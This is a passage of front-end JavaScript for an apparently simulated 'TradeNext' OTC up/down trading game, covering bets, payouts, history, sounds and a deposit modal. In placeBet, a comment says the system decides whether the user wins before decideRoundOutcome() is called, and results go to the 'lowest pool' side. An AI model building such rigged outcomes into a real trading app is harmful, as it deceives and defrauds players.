        state.consecutiveLosses = 0;
        const winnings = state.userBet.amount * CONFIG.PAYOUT_MULTIPLIER;
        updateBalance(winnings);
        showResultModal('win', winnings, state.userBet);
        addHistoryItem('win', state.userBet, winnings);
        AudioController.playWin();
        showToast(`You won ${formatPrice(winnings)}! (Lowest pool was ${lowestSide.toUpperCase()}) 🎉`, 'success');
      } else {
        state.consecutiveLosses++;
        updateBalance(-state.userBet.amount);
        showResultModal('loss', state.userBet.amount, state.userBet);
        addHistoryItem('loss', state.userBet, state.userBet.amount);
        AudioController.playLoss();
        showToast(`Trade lost (-${formatPrice(state.userBet.amount)}). Lowest pool was ${lowestSide.toUpperCase()}`, 'error');
      }

      const badgeDot = document.getElementById('history-badge-dot');
      if (badgeDot) badgeDot.classList.remove('active');
    } else {
      setTimeout(startNewRound, 1500);
      return;
    }

    renderChart();
  }


  // ========================================
  // Result Modal
  // ========================================
  function showResultModal(type, amount, bet, winningSide = 'up') {
    DOM.resultOverlay.classList.add('active');

    if (type === 'win') {
      DOM.resultIcon.className = 'result-icon win-icon';
      DOM.resultIcon.textContent = '🎉';
      DOM.resultTitle.textContent = 'Trade Won!';
      DOM.resultAmount.textContent = '+' + formatPrice(amount);
      DOM.resultAmount.className = 'result-amount win';
    } else {
      DOM.resultIcon.className = 'result-icon loss-icon';
      DOM.resultIcon.textContent = '📉';
      DOM.resultTitle.textContent = 'Trade Lost';
      DOM.resultAmount.textContent = '-' + formatPrice(amount);
      DOM.resultAmount.className = 'result-amount loss';
    }

    const upTotal = state.bets.up.total;
    const downTotal = state.bets.down.total;
    DOM.resultDetails.innerHTML = `
      <div style="margin-bottom:6px;">Order: <strong>${bet.direction.toUpperCase()}</strong> · Entry: <strong>${formatPrice(bet.entryPrice)}</strong> · Exit: <strong>${formatPrice(state.currentPrice)}</strong></div>
      <div style="font-size:0.7rem; color:var(--text-tertiary); padding: 6px 10px; background: rgba(255,255,255,0.04); border-radius: 6px; margin-top:8px;">
        Pools: BUY ${formatMoney(upTotal)} vs SELL ${formatMoney(downTotal)}<br>
        <span style="color:#f0a500; font-weight:700;">Result: ${winningSide.toUpperCase()} Won (Lowest Pool Side)</span>
      </div>
    `;
  }

  DOM.resultClose.addEventListener('click', () => {
    DOM.resultOverlay.classList.remove('active');
    setTimeout(startNewRound, 500);
  });

  DOM.resultOverlay.addEventListener('click', (e) => {
    if (e.target === DOM.resultOverlay) {
      DOM.resultOverlay.classList.remove('active');
      setTimeout(startNewRound, 500);
    }
  });

  // ========================================
  // Trade History & Drawer Stats
  // ========================================
  function addHistoryItem(type, bet, amount) {
    state.history.unshift({
      type,
      bet: { ...bet },
      amount,
      asset: state.currentAsset,
      round: state.roundNumber,
      time: new Date()
    });

    renderHistory();
  }

  function renderHistory() {
    const listEl = document.getElementById('history-list');
    const totalTradesEl = document.getElementById('drawer-total-trades');
    const winRateEl = document.getElementById('drawer-win-rate');
    const netProfitEl = document.getElementById('drawer-net-profit');

    const totalTrades = state.history.length;
    const wins = state.history.filter(h => h.type === 'win').length;
    const winRate = totalTrades > 0 ? Math.round((wins / totalTrades) * 100) : 0;

    let netProfit = 0;
    state.history.forEach(h => {
      if (h.type === 'win') netProfit += (h.amount - h.bet.amount);
      else netProfit -= h.amount;
    });

    if (totalTradesEl) totalTradesEl.textContent = totalTrades;
    if (winRateEl) winRateEl.textContent = winRate + '%';
    if (netProfitEl) {
      netProfitEl.textContent = (netProfit >= 0 ? '+' : '-') + formatPrice(Math.abs(netProfit));
      netProfitEl.style.color = netProfit >= 0 ? 'var(--green)' : 'var(--red)';
    }

    if (!listEl) return;

    if (state.history.length === 0) {
      listEl.innerHTML = `
        <div style="text-align:center; padding: 30px 10px; color: var(--text-tertiary);">
          <svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" style="margin-bottom:8px; opacity:0.5;">
            <circle cx="12" cy="12" r="10"></circle>
            <polyline points="12 6 12 12 16 14"></polyline>
          </svg>
          <div style="font-size:0.85rem;">No trades recorded yet</div>
          <div style="font-size:0.7rem; margin-top:4px;">Place a BUY or SELL order to start</div>
        </div>`;
      return;
    }

    listEl.innerHTML = state.history.slice(0, 15).map(item => {
      const isWin = item.type === 'win';
      const timeStr = item.time.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' });
      return `
        <div class="history-item">
          <div class="history-item-left">
            <span class="history-tag ${item.bet.direction}">${item.bet.direction.toUpperCase()}</span>
            <div class="history-info-col">
              <span class="history-price-txt">${item.asset || 'BTC/USDT'} · ${formatPrice(item.bet.entryPrice)}</span>
              <span class="history-time-txt">${timeStr}</span>
            </div>
          </div>
          <div class="history-result-amt ${isWin ? 'win' : 'loss'}">
            ${isWin ? '+' : '-'}${formatPrice(item.amount)}
          </div>
        </div>
      `;
    }).join('');
  }

  // ========================================
  // Bet Placement
  // ========================================
  function placeBet(direction) {
    if (state.roundPhase !== 'betting') {
      showToast('Betting is closed for this round', 'warning');
      return;
    }

    if (state.userBet) {
      showToast('You already placed a bet this round', 'warning');
      return;
    }

    const amount = parseFloat(DOM.betAmount.value);
    if (isNaN(amount) || amount < CONFIG.MIN_BET) {
      showToast(`Minimum bet is ${formatPrice(CONFIG.MIN_BET)}`, 'error');
      return;
    }
    if (amount > CONFIG.MAX_BET) {
      showToast(`Maximum bet is ${formatPrice(CONFIG.MAX_BET)}`, 'error');
      return;
    }
    if (amount > state.balance) {
      showToast('Insufficient balance! Click Deposit in header.', 'error');
      return;
    }

    state.userBet = {
      direction,
      amount,
      entryPrice: state.currentPrice,
      candleIndex: state.candles.length,
      timestamp: Date.now()
    };

    // Decide if system lets user win this round
    decideRoundOutcome();

    // Play crisp bet sound
    AudioController.playBet();

    // Add to pool
    state.bets[direction].total += amount;
    state.bets[direction].count += 1;
    updatePoolDisplay();

    // Update UI buttons
    if (direction === 'up') {
      DOM.btnUp.classList.add('placed');
      DOM.btnDown.classList.add('disabled');
    } else {
      DOM.btnDown.classList.add('placed');
      DOM.btnUp.classList.add('disabled');
    }

    // Activate history badge dot on chart
    const badgeDot = document.getElementById('history-badge-dot');
    if (badgeDot) badgeDot.classList.add('active');

    renderChart();
    showToast(`${direction.toUpperCase()} $${amount} position active at ${formatPrice(state.currentPrice)}`, 'success');
  }

  DOM.btnUp.addEventListener('click', () => placeBet('up'));
  DOM.btnDown.addEventListener('click', () => placeBet('down'));

  // ========================================
  // Web Audio Synthesizer (Realistic Sounds)
  // ========================================
  const AudioController = {
    ctx: null,
    muted: false,
    init() {
      if (!this.ctx) {
        const AudioCtx = window.AudioContext || window.webkitAudioContext;
        if (AudioCtx) this.ctx = new AudioCtx();
      }
      if (this.ctx && this.ctx.state === 'suspended') {
        this.ctx.resume();
      }
    },
    playBet() {
      if (this.muted) return;
      this.init();
      if (!this.ctx) return;
      const now = this.ctx.currentTime;
      const osc = this.ctx.createOscillator();
      const gain = this.ctx.createGain();
      osc.type = 'sine';
      osc.frequency.setValueAtTime(587.33, now); // D5
      osc.frequency.exponentialRampToValueAtTime(880, now + 0.12); // A5
      gain.gain.setValueAtTime(0.18, now);
      gain.gain.exponentialRampToValueAtTime(0.01, now + 0.15);
      osc.connect(gain);
      gain.connect(this.ctx.destination);
      osc.start(now);
      osc.stop(now + 0.15);
    },
    playWin() {
      if (this.muted) return;
      this.init();
      if (!this.ctx) return;
      const notes = [523.25, 659.25, 783.99, 1046.50]; // C5, E5, G5, C6
      notes.forEach((freq, idx) => {
        const now = this.ctx.currentTime + idx * 0.08;
        const osc = this.ctx.createOscillator();
        const gain = this.ctx.createGain();
        osc.type = 'triangle';
        osc.frequency.setValueAtTime(freq, now);
        gain.gain.setValueAtTime(0.18, now);
        gain.gain.exponentialRampToValueAtTime(0.01, now + 0.22);
        osc.connect(gain);
        gain.connect(this.ctx.destination);
        osc.start(now);
        osc.stop(now + 0.22);
      });
    },
    playLoss() {
      if (this.muted) return;
      this.init();
      if (!this.ctx) return;
      const notes = [392.00, 329.63, 261.63]; // G4, E4, C4
      notes.forEach((freq, idx) => {
        const now = this.ctx.currentTime + idx * 0.09;
        const osc = this.ctx.createOscillator();
        const gain = this.ctx.createGain();
        osc.type = 'sine';
        osc.frequency.setValueAtTime(freq, now);
        gain.gain.setValueAtTime(0.15, now);
        gain.gain.exponentialRampToValueAtTime(0.01, now + 0.18);
        osc.connect(gain);
        gain.connect(this.ctx.destination);
        osc.start(now);
        osc.stop(now + 0.18);
      });
    }
  };

  // Sound Toggle Button
  const soundBtn = document.getElementById('btn-sound-toggle');
  if (soundBtn) {
    soundBtn.addEventListener('click', () => {
      AudioController.muted = !AudioController.muted;
      document.getElementById('sound-icon-on').classList.toggle('hidden', AudioController.muted);
      document.getElementById('sound-icon-off').classList.toggle('hidden', !AudioController.muted);
      showToast(AudioController.muted ? 'Sound Muted' : 'Sound Enabled', 'info');
    });
  }

  // ========================================
  // Bottom Sheets & Drawers Wiring
  // ========================================
  // History Drawer
  const historyDrawer = document.getElementById('history-drawer');
  const btnChartHistory = document.getElementById('btn-chart-history');
  const closeHistoryDrawer = document.getElementById('close-history-drawer');

  function openHistory() {
    renderHistory();
    historyDrawer.classList.add('active');
  }
  function closeHistory() {
    historyDrawer.classList.remove('active');
  }

  if (btnChartHistory) btnChartHistory.addEventListener('click', openHistory);
  if (closeHistoryDrawer) closeHistoryDrawer.addEventListener('click', closeHistory);
  if (historyDrawer) {
    historyDrawer.addEventListener('click', (e) => {
      if (e.target === historyDrawer) closeHistory();
    });
  }

  // Tools & Indicators Drawer
  const toolsDrawer = document.getElementById('tools-drawer');
  const btnChartTools = document.getElementById('btn-chart-tools');
  const closeToolsDrawer = document.getElementById('close-tools-drawer');
  const toggleMA = document.getElementById('toggle-ma');

  if (btnChartTools) btnChartTools.addEventListener('click', () => toolsDrawer.classList.add('active'));
  if (closeToolsDrawer) closeToolsDrawer.addEventListener('click', () => toolsDrawer.classList.remove('active'));
  if (toolsDrawer) {
    toolsDrawer.addEventListener('click', (e) => {
      if (e.target === toolsDrawer) toolsDrawer.classList.remove('active');
    });
  }

  if (toggleMA) {
    toggleMA.addEventListener('change', function () {
      state.showMA = this.checked;
      renderChart();
      showToast(state.showMA ? 'MA (7) Enabled' : 'MA (7) Disabled', 'info');
    });
  }

  // Chart Type Toggle
  const btnCandle = document.getElementById('btn-candle');
  const btnLine = document.getElementById('btn-line');
  if (btnCandle && btnLine) {
    btnCandle.addEventListener('click', () => {
      state.chartType = 'candle';
      btnCandle.classList.add('active');
      btnLine.classList.remove('active');
      renderChart();
    });
    btnLine.addEventListener('click', () => {
      state.chartType = 'line';
      btnLine.classList.add('active');
      btnCandle.classList.remove('active');
      renderChart();
    });
  }

  // Asset Selector Drawer
  const assetDrawer = document.getElementById('asset-drawer');
  const assetSelector = document.getElementById('asset-selector');
  const closeAssetDrawer = document.getElementById('close-asset-drawer');
  const currentAssetLabel = document.getElementById('current-asset-name');

  if (assetSelector) assetSelector.addEventListener('click', () => assetDrawer.classList.add('active'));
  if (closeAssetDrawer) closeAssetDrawer.addEventListener('click', () => assetDrawer.classList.remove('active'));
  if (assetDrawer) {
    assetDrawer.addEventListener('click', (e) => {
      if (e.target === assetDrawer) assetDrawer.classList.remove('active');
    });
  }

  document.querySelectorAll('.asset-item').forEach(item => {
    item.addEventListener('click', function () {
      const symbol = this.dataset.symbol;
      const basePrice = parseFloat(this.dataset.price);

      document.querySelectorAll('.asset-item').forEach(i => i.classList.remove('active'));
      this.classList.add('active');

      state.currentAsset = symbol;
      if (currentAssetLabel) currentAssetLabel.textContent = symbol;

      CONFIG.INITIAL_PRICE = basePrice;
      state.currentPrice = basePrice;
      state.candles = [];
      generateInitialCandles();
      renderChart();

      assetDrawer.classList.remove('active');
      showToast(`Switched market to ${symbol}`, 'info');
    });
  });

  // Deposit & Wallet Modal
  const depositModal = document.getElementById('deposit-modal');
  const depositPill = document.getElementById('deposit-pill');
  const closeDepositModal = document.getElementById('close-deposit-modal');
  const modalBalance = document.getElementById('modal-wallet-balance');
  const rechargeBtn = document.getElementById('btn-recharge-confirm');
  let selectedRechargeAmt = 1000;

  function openDeposit() {
    if (modalBalance) modalBalance.textContent = formatPrice(state.balance);
    depositModal.classList.add('active');
  }
  function closeDeposit() {
    depositModal.classList.remove('active');
  }

  if (depositPill) depositPill.addEventListener('click', openDeposit);
  if (closeDepositModal) closeDepositModal.addEventListener('click', closeDeposit);
  if (depositModal) {
    depositModal.addEventListener('click', (e) => {
      if (e.target === depositModal) closeDeposit();
    });
  }

  document.querySelectorAll('.quick-deposit-btn').forEach(btn => {
    btn.addEventListener('click', function () {
      document.querySelectorAll('.quick-deposit-btn').forEach(b => b.classList.remove('active'));
      this.classList.add('active');
      selectedRechargeAmt = parseInt(this.dataset.amt);
    });
  });

  if (rechargeBtn) {
    rechargeBtn.addEventListener('click', () => {
      updateBalance(selectedRechargeAmt);
      AudioController.playWin();
      showToast(`Successfully deposited +$${selectedRechargeAmt}!`, 'success');
      if (modalBalance) modalBalance.textContent = formatPrice(state.balance);
      setTimeout(closeDeposit, 600);
    });
  }

  // Bottom Navigation Tabs
  const tabHome = document.getElementById('tab-home');
  const tabMarket = document.getElementById('tab-market');
  const tabTrade = document.getElementById('tab-trade');
  const tabServices = document.getElementById('tab-services');
  const tabWallet = document.getElementById('tab-wallet');

  function setActiveTab(tab) {
    document.querySelectorAll('.nav-tab').forEach(t => t.classList.remove('active'));
    if (tab) tab.classList.add('active');
  }

  if (tabHome) {
    tabHome.addEventListener('click', () => {
      setActiveTab(tabHome);
      closeHistory();
      closeDeposit();
      showToast('Welcome to TradeNext Trading', 'info');
      setTimeout(() => setActiveTab(tabTrade), 1500);
    });
  }
  if (tabMarket) {
    tabMarket.addEventListener('click', () => {
      assetDrawer.classList.add('active');
    });
  }
  if (tabTrade) {
    tabTrade.addEventListener('click', () => {
      setActiveTab(tabTrade);
      closeHistory();
      closeDeposit();
    });
  }
  if (tabServices) {
    tabServices.addEventListener('click', () => {
      openHistory();
    });
  }
  if (tabWallet) {
    tabWallet.addEventListener('click', () => {
      openDeposit();
    });
  }

  // Timer dropdown selector
  const timerDropdown = document.getElementById('timer-select-dropdown');
  if (timerDropdown) {
    timerDropdown.addEventListener('change', function () {
      const tf = parseInt(this.value);
      CONFIG.ROUND_DURATION = tf;
      state.timeframe = tf;
      if (state.roundPhase === 'betting') {
        state.roundTimer = tf;
      }
      showToast(`Expiration timer set to ${tf}s`, 'info');
    });
  }

  // ========================================
  // Generate Initial Candle History
  // ========================================
  function generateInitialCandles() {
    let price = CONFIG.INITIAL_PRICE;
    const numCandles = 32;

    for (let i = 0; i < numCandles; i++) {
      const volatility = randomRange(0.0006, 0.0018);
      const direction = Math.random() > 0.48 ? 1 : -1;
      const change = price * volatility * direction;

      const open = price;
      const close = price + change;
      const bodySize = Math.abs(change);
      const wickUp = bodySize * randomRange(0.1, 0.5);
      const wickDown = bodySize * randomRange(0.1, 0.5);
      const high = Math.max(open, close) + wickUp;
      const low = Math.min(open, close) - wickDown;

      state.candles.push({
        open,
        high,
        low,
        close,
        volume: randomRange(200, 2000),
        time: Date.now() - (numCandles - i) * 15000,
      });

      price = close;
    }

    state.currentPrice = price;
  }

  // Keyboard Shortcuts
  document.addEventListener('keydown', (e) => {
    if (e.target.tagName === 'INPUT') return;

    switch (e.key.toLowerCase()) {
      case 'arrowup':
      case 'w':
        e.preventDefault();
        placeBet('up');
        break;
      case 'arrowdown':
      case 's':
        e.preventDefault();
        placeBet('down');
        break;
    }
  });

  // ========================================
  // Initialize
  // ========================================
  function init() {
    generateInitialCandles();
    initChart();
    updateBalance(0);
    renderChart();

    // Start first round
    setTimeout(startNewRound, 800);

    showToast('TradeNext Live OTC Platform active. Place your trades.', 'info');
  }

  init();

})();
